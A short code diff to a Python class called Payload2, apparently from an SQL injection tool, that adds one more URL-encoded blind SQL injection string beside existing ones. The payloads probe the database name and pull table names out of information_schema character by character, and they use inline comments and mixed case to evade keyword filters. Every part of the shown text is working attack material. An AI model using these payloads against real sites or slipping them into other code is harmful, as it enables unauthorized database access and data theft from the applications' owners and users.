@@ -56,6 +56,8 @@ class Payload2(object):
     payloads5 = "%20%26%26%20(left(hex(database/**/()),{})={}"
 
     payloads6 = "%20%26%26%20(1=(select%20count(/*!table_name*/)%20from%20information_Schema.tables%20where%20table_schema=0x{}))"
+    payloads7 = "%20%26%26%20hex/**/(substr((select%20concat(/*!TaBle_nAme*/)%20from%20information_schema.taBles%20where%20table_schema=0x74657374%20limit%200,1),1,1))"
+
 
     
 # s = Payload2()
